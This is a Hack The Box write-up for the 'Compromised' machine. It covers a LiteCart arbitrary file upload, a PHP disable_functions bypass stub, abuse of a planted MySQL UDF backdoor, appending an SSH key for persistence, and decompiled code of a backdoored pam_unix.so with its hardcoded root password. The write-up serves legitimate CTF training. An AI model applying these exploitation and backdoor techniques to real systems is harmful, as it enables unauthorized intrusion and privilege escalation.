Overview (TL;DR)
================

>The box is compromised, and it's up to us to retrace the attacker's steps and find any backdoors that were left behind.

1. Finding backups and using it to find admin creds
2. Arbitrary File Upload in LiteCart 2.1.2 (CVE-2018-12256)
3. PHP 7.0-7.3 disable_functions bypass
4. Mysql backdoor using user defined functions and default mysql creds
5. Using mysql user to find credentials for the sysadmin user and getting user.txt
6. `dpkg -V` indicates an integrity violation for `/lib/x86_64-linux-gnu/security/pam_unix.so`
7. Static analysis using ghidra to find a backdoor password in `pam_sm_authenticate` to root user, `su root` to get root.txt

# Initial foothold (www-data)

## Nmap scan

The initial nmap TCP scan was enough to complete this box, there were only 2 ports open SSH on 22 and HTTP on 80. So by default we will check HTTP 80 and not bruteforce SSH creds _because we are good boys_

```sh
# Nmap 7.80 scan initiated Sun Sep 13 02:56:07 2020 as: nmap -sC -sV -oN nmap/agro-full-tcp.nmap -A -p- -v 10.129.12.183
Nmap scan report for 10.129.12.183
Host is up (0.12s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: FD8AFB6FFE392F9ED98CC0B1B37B9A5D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Legitimate Rubber Ducks | Online Store
|_Requested resource was http://10.129.12.183/shop/en/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (91%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 - 3.1 (86%), Linux 2.6.39 - 3.2 (86%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 31.022 days (since Thu Aug 13 02:27:47 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   145.38 ms 10.10.16.1
2   145.47 ms 10.129.12.183

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 13 02:59:47 2020 -- 1 IP address (1 host up) scanned in 220.95 seconds
```

## Looking at HTTP port 80

Opening the web browser and typing in the ip address will redirect us to the web page `http://10.10.10.207/shop/en`

![img](/path/to/webpage/img "le epic txt")

The first thing we can get off of the main page is the content management system (CMS) name, which is `litecart`. If we search for an exploit we will see that version 2.1.2 has an authenticated arbitrary file upload... WE NEED CREDS!

```sh
kali@kali:~/Documents/HackTheBox/compromised$ searchsploit litecart
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path                          
---------------------------------------------- ---------------------------------
LiteCart 2.1.2 - Arbitrary File Upload        | php/webapps/45267.py           
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Gobuster to find loot!

When I use Gobuster in CTFs or HTB I like to use the most common wordlists such as those in `/usr/share/wordlists/dirb` as it will 90% of the time catch the intended path. Anyways back to the box, gobuster located a `/backup` directory. Yay for loot!

```sh
kali@kali:~/Documents/HackTheBox/compromised$ gobuster dir -u http://compromised.htb -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://compromised.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/02 07:45:41 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.hta (Status: 403)
/.htaccess (Status: 403)
/backup (Status: 301)
/index.php (Status: 302)
/server-status (Status: 403)
/shop (Status: 301)
===============================================================
2020/10/02 07:46:25 Finished
===============================================================
```

Going to `http://10.10.10.207/backup/` we will find directory listing and inside there is a file `a.tar.gz` that is probably the backup of the websites files, so we should download it and check it out. 

![img](/path/to/backup "a.tar.gz")

## Inspecting `a.tar.gz`

Normally if we try to extract the content of this tar archive we will use `tar -zxvf a.tar.gz` however we get this result...

```sh
kali@kali:~/Documents/HackTheBox/compromised/backup$ tar -zxvf a.tar.gz

gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now
```

Sneaky... Even though it has `.gz` in the name it doesn't have gzip format, which means it is just `a.tar`, either way we can still extract it by removing the `-z` flag from the command. Specifying `tar -xvf a.tar.gz` will give us the content in a directory called `/shop` similar to the one we saw in the webpage. 

There are a lot of files inside `/shop` and you can easily go down the rabbit hole of checking `/shop/logs` or `/shop/cache`, however after narrowing down the search by checking the `/shop/admin` directory the `login.php` script has a commented out line...

```PHP
<?php
  require_once('../includes/app_header.inc.php');

  document::$template = settings::get('store_template_admin');
  document::$layout = 'login';

  if (!empty($_GET['redirect_url'])) {
    $redirect_url = (basename(parse_url($_REQUEST['redirect_url'], PHP_URL_PATH)) != basename(__FILE__)) ? $_REQUEST['redirect_url'] : document::link(WS_DIR_ADMIN);
  } else {
    $redirect_url = document::link(WS_DIR_ADMIN);
  }

  header('X-Robots-Tag: noindex');
  document::$snippets['head_tags']['noindex'] = '<meta name="robots" content="noindex" />';

  if (!empty(user::$data['id'])) notices::add('notice', language::translate('text_already_logged_in', 'You are already logged in'));

  if (isset($_POST['login'])) {
    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
    user::login($_POST['username'], $_POST['password'], $redirect_url, isset($_POST['remember_me']) ? $_POST['remember_me'] : false);
  }

  if (empty($_POST['username']) && !empty($_SERVER['PHP_AUTH_USER'])) $_POST['username'] = !empty($_SERVER['PHP_AUTH_USER']) ? $_SERVER['PHP_AUTH_USER'] : '';

  $page_login = new view();
  $page_login->snippets = array(
    'action' => $redirect_url,
  );
  echo $page_login->stitch('pages/login');

  require_once vmod::check(FS_DIR_HTTP_ROOT . WS_DIR_INCLUDES . 'app_footer.inc.php');
```

That `file_put_contents()` line will put the credentials entered by the user in a file called `.log2301c9430d8593ae.txt` in the `/shop/admin` directory so it is worth checking if that file exists or not by visiting `http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt`

![img](/path/to/admin/creds "noice!")

>User: admin Passwd: theNextGenSt0r3!~

And just like that we found admin credentials for the CMS, time to see how the CVE works now. 

## CVE-2018-12256 Arbitrary File Upload

The [exploit](https://www.exploit-db.com/exploits/45267) is pretty straight forward, you can send PHP scripts to the server to be executed via the `vQmod` xml upload capability, the server will accept the request only if you change the `Content-Type: application/x-php` from `x-php` to `xml` 

![img](/path/to/upload "original request")
![img](/path/to/upload/modified "modified request")

vQmods are saved in this directory `/shop/vqmod/xml/` so our uploaded `info.php` is in `/shop/vqmod/xml/info.php` visiting `http://10.10.10.207/shop/vqmod/xml/info.php` will give us the PoC and print the PHP configuration of the server. 

![img](/path/to/phpinfo "phpinfo(); go brrrr")
![img](/path/to/phpinfo/disabledfunctions "Oh no disabled_functions... oh well")

Scrolling through the phpinfo output, we can see a lot of information about the host `compromised` as well as the php version `7.2.24-0ubuntu0.18.04.6` and the fact that there are a lot of disabled functions that will make it hard for us to get command execution on the server. After a lot of searching on the internet, I found this [exploit](https://raw.githubusercontent.com/mm0r1/exploits/master/php7-gc-bypass/exploit.php) on github, that uses old php bugs to bypass the `disable_functions` config. 

```PHP
<?php
# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=72530
#
# This exploit should work on all PHP 7.0-7.3 versions
#
# Author: https://github.com/mm0r1

pwn($_GET["cmd"]);

function pwn($cmd) {
    global $abc, $helper;
    ...
...
```

>I added a simple `$_GET["cmd"]` to get a pseudo-shell ad `www-data`

I created the php bypass file `freeze.php` and uploaded it using the CVE and tried visiting `http://10.10.10.207/shop/vqmod/xml/freeze.php?cmd=id` and ...

![img](/path/to/php/bypass "Tadaa!!")

We have our first user, and the journey is just getting started. 

## Bonus Pseudo-Shell using [Webwrap](https://github.com/mxrch/webwrap)

Just visit the repo and install webwrap, use the syntax `webwrap http://10.10.10.207/shop/vqmod/xml/freeze.php?cmd=WRAP` and you should get a Pseuto-shell as www-data

```sh
kali@kali:~/Documents/HackTheBox/compromised$ webwrap http://10.10.10.207/shop/vqmod/xml/freeze.php?cmd=WRAP

www-data@compromised:/var/www/html/shop/vqmod/xml$ uname -a && id
Linux compromised 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Getting User

## From `www-data` to `mysql`

Looking at the files in `/var/www/html/shop` focusing on the config files, there is something interesting in `includes/config.inc.php` and I believe it occurs in other files as well, however the interesting thing is the default mysql credentials. 

```PHP
// Database
  define('DB_TYPE', 'mysql');
  define('DB_SERVER', 'localhost');
  define('DB_USERNAME', 'root');
  define('DB_PASSWORD', 'changethis');
  define('DB_DATABASE', 'ecom');
  define('DB_TABLE_PREFIX', 'lc_');
  define('DB_CONNECTION_CHARSET', 'utf8');
  define('DB_PERSISTENT_CONNECTIONS', 'false');
```
Trying out these credentials using `mysql -u root --password=changethis -e "show databases"`

```shell
www-data@compromised:/var/www/html/shop$ mysql -u root --password=changethis -e "show databases"
mysql: [Warning] Using a password on the command line interface can be insecure.
Database
information_schema
ecom
mysql
performance_schema
sys
```

Now I've stared at this part for quite a while and the creator was giving nudges, he told me to look for common ways the database could be backdoored. So I google-fu'ed my way to find [this](https://pure.security/simple-mysql-backdoor-using-user-defined-functions/) which is a way to insert a user defined function to be executed as the `mysql` user. After reading the blog, I enumerated the `mysql` database and found the `func` table and it has 1 entry

```sh
www-data@compromised:/var/www/html/shop$ mysql -u root --password=changethis -D mysql -e "Select * from func"
mysql: [Warning] Using a password on the command line interface can be insecure.
name    ret     dl      type
exec_cmd        0       libmysql.so     function
```

Trying to execute this function we are prompted that the function requires an argument of a string value

```sh
www-data@compromised:/var/www/html/shop/vqmod/xml$ mysql -u root --password=changethis -D mysql -e "SELECT exec_cmd()"
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR 1123 (HY000) at line 1: Can't initialize function 'exec_cmd'; exec_cmd(): Incorrect usage; usage: exec_cmd(string)
```

From that prompt I assume that the correct syntax will be `exec_cmd('command_here')` so lets try running the `id` command.

```sh
www-data@compromised:/var/www/html/shop/vqmod/xml$ mysql -u root --password=changethis -D mysql -e "SELECT exec_cmd('id')"
mysql: [Warning] Using a password on the command line interface can be insecure.
exec_cmd('id')
uid=111(mysql) gid=113(mysql) groups=113(mysql)\n\0\0...
```

Great! we have access to the `mysql` user, looking at the `/etc/passwd` file we can see that its home directory is `/var/lib/mysql` and it is assigned to a shell `/bin/bash`

```sh
root:x:0:0:root:/root:/bin/bash
...
sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
...
```

When I first did the box, I changed the permissions of the `/var/lib/mysql` directory so we can have a look at it using the `webwrap` shell, typing the command, since the box is already compromised so might as well use `chmod 777 /var/lib/mysql`.

```sh
drwxrwxrwx  9 mysql mysql     4096 Oct  2 18:30 .
drwxr-xr-x 43 root  root      4096 May 24 21:21 ..
lrwxrwxrwx  1 root  root         9 May  9 03:09 .bash_history -> /dev/null
drwx------  3 mysql mysql     4096 May  9 03:07 .gnupg
drwxrwxr-x  3 mysql mysql     4096 May  9 03:08 .local
lrwxrwxrwx  1 root  root         9 May 13 03:02 .mysql_history -> /dev/null
drwxrwxr-x  2 mysql mysql     4096 Sep  3 11:52 .ssh
-rw-r-----  1 mysql mysql       56 May  8 16:02 auto.cnf
....
drwxr-x---  2 mysql mysql    12288 May  8 16:02 sys
```

Running `ls -la /var/lib/mysql` we can see that there is a `.ssh` directory, if we go into that directory we will see the `authorized_keys` file, adding our public ssh key in that file will let us ssh into the box as `mysql`

```sh
www-data@compromised:/var/www/html/shop/vqmod/xml$ mysql -u root --password=changethis -D mysql -e "SELECT exec_cmd('echo ssh-rsa REDACTED kali@kali >> /var/lib/mysql/.ssh/authorized_keys')"
```
Before using `ssh` we need to change the permissions of the `/var/lib/mysql` directory back to its original form `chmod 700 /var/lib/mysql` using the `exec_cmd()` function. Now when we try to `ssh` we will be mysql user

```sh
kali@kali:~/Documents/HackTheBox/compromised$ ssh mysql@compromised.htb
Last login: Sat Oct  3 08:08:01 2020 from 10.10.1X.X
mysql@compromised:~$ id
uid=111(mysql) gid=113(mysql) groups=113(mysql)
mysql@compromised:~$
```

Now that we have a better shell, we can enumerate efficiently to get out the next user which is `sysadmin`...

## From `mysql` to `sysadmin`

Going for any low hanging fruit by typing `grep -nilr sysadmin` in the home directory of `mysql` we will see only one file that pops up. 

```sh
mysql@compromised:~$ grep -nlir sysadmin
strace-log.dat
mysql@compromised:~$
```

Looking carefully in that file we can see a couple of entries of `sysadmin` and part of his password, continue reading the log carefully we can see an entry where his full password is shown

```
...
22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
22227 03:11:09 brk(NULL)                = 0xbe1000
22227 03:11:09 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
...
```

Password is `3*NLJE32I$Fe` so we can `su sysadmin` and paste in that password to get the user.txt from `/home/sysadmin` directory. 

```sh
mysql@compromised:~$ su sysadmin
Password: 
sysadmin@compromised:/var/lib/mysql$ cd
sysadmin@compromised:~$ wc -c user.txt 
33 user.txt
sysadmin@compromised:~$
```

# Getting Root

## Static Analysis of `pam_unix.so`

After getting a hint on this part of the box, `dpkg --verify` was the way to know that there was some modification to the deb packages installed by default. You can read more about it [here](https://askubuntu.com/questions/792553/dpkg-v-what-does-the-output-mean).

The interesting part about the output of `dpkg --verify` was that line

```sh
??5??????   /lib/x86_64-linux-gnu/security/pam_unix.so
```
Which indicated that `pam_unix.so` failed the integrity check, that is weird... And definitely worth checking out, you can move this binary from the box to your own machine using `scp` or `base32 pam_unix.so` and decode the output in your own machine.

```sh
kali@kali:~/Documents/HackTheBox/compromised$ scp sysadmin@compromised.htb:/lib/x86_64-linux-gnu/security/pam_unix.so ./pam_unix.so
sysadmin@compromised.htb's password: 
pam_unix.so                                100%  194KB 180.6KB/s   00:01    
kali@kali:~/Documents/HackTheBox/compromised$ ls -la pam_unix.so
-rw-r--r-- 1 kali kali 198440 Sep 29 11:22 pam_unix.so
```

Researching this binary [here](https://man7.org/linux/man-pages/man3/pam.3.html) and getting a hint from the awesome forums, led me to [this](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html) function which is used during the authentication process while using `su` binary. I used [ghidra](https://ghidra-sre.org/) when analyzing `pam_unix.so` and read the decompiled C code of the function `pam_sm_authenticate`

```C++

/* WARNING: Could not reconcile some variable overlaps */

int pam_sm_authenticate(pam_handle_t *pamh,int flags,int argc,char **argv)

{
  ulong uVar1;
  uint ctrl;
  int iVar2;
  int iVar3;
  char *prompt1;
  int *__ptr;
  uint uVar4;
  long in_FS_OFFSET;
  char *name;
  void *p;
  char backdoor [15];
  byte local_40;
  
  uVar1 = *(ulong *)(in_FS_OFFSET + 0x28);
  local_40 = (byte)uVar1;
  ctrl = _set_ctrl(pamh,flags,(int *)0x0,(int *)0x0,(int *)0x0,argc,argv);
  uVar4 = ctrl & 0x40000;
  if (uVar4 == 0) {
    __ptr = (int *)0x0;
  }
  else {
    __ptr = (int *)malloc(4);
  }
  iVar2 = pam_get_user(pamh,&name,0);
  if (iVar2 == 0) {
    if ((name != (char *)0x0) && ((*name - 0x2bU & 0xfd) != 0)) {
      iVar3 = _unix_blankpasswd(pamh,ctrl,name);
      if (iVar3 == 0) {
        prompt1 = (char *)dcgettext("Linux-PAM","Password: ",5);
        iVar2 = _unix_read_password(pamh,ctrl,(char *)0x0,prompt1,(char *)0x0,"-UN*X-PASS",&p);
        if (iVar2 == 0) {
          backdoor._0_8_ = 0x4533557e656b6c7a; //little endian: zlke~U3E
          backdoor._8_7_ = 0x2d326d3238766e; //little endian: nv82m2-
          local_40 = 0;
          iVar2 = strcmp((char *)p,backdoor);
          if (iVar2 != 0) {
            iVar2 = _unix_verify_password(pamh,name,(char *)p,ctrl);
          }
          p = (void *)0x0;
        }
        else {
          if (iVar2 == 0x1e) {
            iVar2 = 0x1f;
          }
          else {
            pam_syslog(pamh,2,"auth could not identify password for [%s]",name);
          }
        }
        name = (char *)0x0;
        if (uVar4 != 0) goto LAB_00103100;
      }
      else {
        name = (char *)0x0;
        if (uVar4 != 0) {
          if (__ptr == (int *)0x0) goto LAB_00103059;
          *__ptr = 0;
          goto LAB_00103017;
        }
      }
LAB_0010304c:
      if (__ptr != (int *)0x0) {
        free(__ptr);
      }
      goto LAB_00103059;
    }
    pam_syslog(pamh,3,"bad username [%s]");
    if (uVar4 == 0) {
      if (__ptr == (int *)0x0) {
        iVar2 = 10;
      }
      else {
        iVar2 = 10;
        free(__ptr);
      }
      goto LAB_00103059;
    }
    iVar2 = 10;
    if (__ptr == (int *)0x0) goto LAB_00103059;
    *__ptr = 10;
    iVar2 = 10;
  }
  else {
    if (iVar2 == 0x1e) {
      iVar2 = 0x1f;
    }
    if (uVar4 == 0) goto LAB_0010304c;
LAB_00103100:
    if (__ptr == (int *)0x0) goto LAB_00103059;
    *__ptr = iVar2;
  }
LAB_00103017:
  pam_set_data(pamh,"unix_setcred_return",__ptr,setcred_free);
LAB_00103059:
  if ((uVar1 & 0xffffffffffffff00 | (ulong)local_40) == *(ulong *)(in_FS_OFFSET + 0x28)) {
    return iVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Right off the bat, we can see a string called `backdoor` which is an array of 15 chars, it has a hard coded value of `backdoor._0_8_ = 0x4533557e656b6c7a` and `backdoor._8_7_ = 0x2d326d3238766e;` these hex values when turned into ascii in little endian formate they will produce `zlke~U3E` and `nv82m2-` respectively, combined together makes the backdoor `su root` password

```sh
sysadmin@compromised:~$ su root
Password: zlke~U3Env82m2-
root@compromised:/home/sysadmin# id && cd && wc -c root.txt
uid=0(root) gid=0(root) groups=0(root)
33 root.txt
root@compromised:~#
```

That concludes the writeup for Compromised, the hard linux machine from hack the box. 


_logout..._